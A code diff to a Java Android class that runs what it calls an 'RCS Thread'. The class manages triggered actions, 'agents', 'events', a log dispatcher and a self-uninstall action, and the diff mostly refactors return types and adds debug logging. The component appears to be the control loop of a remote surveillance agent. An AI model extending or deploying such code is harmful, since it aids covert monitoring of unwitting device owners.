@@ -119,9 +119,11 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean coreStop() {
 		bStopCore = true;
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
 		}
+		
 		wl.release();
 		coreThread=null;
 		return true;
@@ -139,7 +141,6 @@ public class Core extends Activity implements Runnable {
 		}
 
 		try {
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
 			}
@@ -158,7 +159,12 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
 				}
 
+				// Torna true in caso di UNINSTALL o false in caso di stop del servizio
 				checkActions();
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "CheckActions() wants to exit"); //$NON-NLS-1$
+				}
 			}
 
 			stopAll();
@@ -170,6 +176,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " AndroidService exit "); //$NON-NLS-1$
 			}
+
 			Utils.sleep(1000);
 
 			System.runFinalizersOnExit(true);
@@ -178,7 +185,7 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-	private synchronized Exit checkActions() {
+	private synchronized boolean checkActions() {
 
 		checkActionFast = new CheckAction(Action.FAST_QUEUE);
 
@@ -198,7 +205,7 @@ public class Core extends Activity implements Runnable {
 		}
 
 		public void run() {
-			Exit ret = checkActions(queue);
+			boolean ret = checkActions(queue);
 		}
 	}
 
@@ -206,9 +213,9 @@ public class Core extends Activity implements Runnable {
 	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
 	 * bloccante.
 	 * 
-	 * @return true, if successful
+	 * @return true, if UNINSTALL
 	 */
-	private Exit checkActions(int qq) {
+	private boolean checkActions(int qq) {
 		final Status status = Status.self();
 
 		try {
@@ -216,6 +223,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
 				}
+
 				final Trigger[] actionIds = status.getTriggeredActions(qq);
 
 				if (actionIds.length == 0) {
@@ -223,6 +231,7 @@ public class Core extends Activity implements Runnable {
 						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
 					}
 				}
+
 				for (final Trigger trigger : actionIds) {
 					final Action action = status.getAction(trigger.getActionId());
 					final Exit exitValue = executeAction(action, trigger);
@@ -231,14 +240,15 @@ public class Core extends Activity implements Runnable {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
 						}
+
 						UninstallAction.actualExecute();
 
-						return exitValue;
+						return true;
 					}
 				}
 			}
 
-			return Exit.STOP;
+			return false;
 		} catch (final Throwable ex) {
 			// catching trowable should break the debugger ans log the full
 			// stack trace
@@ -246,8 +256,8 @@ public class Core extends Activity implements Runnable {
 				Check.log(ex);//$NON-NLS-1$
 				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
 			}
-
-			return Exit.ERROR;
+			
+			return false;
 		}
 	}
 
@@ -255,27 +265,38 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopAll)");
 		}
+
 		final Status status = Status.self();
+
 		// status.setRestarting(true);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Warn: " + "checkActions: unTriggerAll"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
+
 		status.unTriggerAll();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
 		}
+
 		agentManager.stopAll();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
 		}
+
 		eventManager.stopAll();
+
 		Utils.sleep(2000);
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
 		}
+
 		status.unTriggerAll();
 
 		final LogDispatcher logDispatcher = LogDispatcher.self();
+
 		if (!logDispatcher.isAlive()) {
 			logDispatcher.waitOnEmptyQueue();
 			logDispatcher.halt();
@@ -492,17 +513,20 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " CheckActions() triggered: " + action); //$NON-NLS-1$
 		}
+
 		final Status status = Status.self();
 		status.unTriggerAction(action);
 
 		status.synced = false;
 
 		final int ssize = action.getSubActionsNum();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions, " + ssize + " subactions"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		int i = 1;
+
 		for (final SubAction subAction : action.getSubActions()) {
 			try {
 
@@ -527,7 +551,6 @@ public class Core extends Activity implements Runnable {
 
 					exit = Exit.UNINSTALL;
 					break;
-
 				}
 
 				if (ret == false) {
@@ -575,18 +598,22 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): valid conf");
 			}
+			
 			stopAll();
+
 			int ret = taskInit();
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): END");
 			}
+
 			return ret != ConfType.Error;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): invalid conf");
 			}
+
 			return false;
 		}
 	}
-
 }
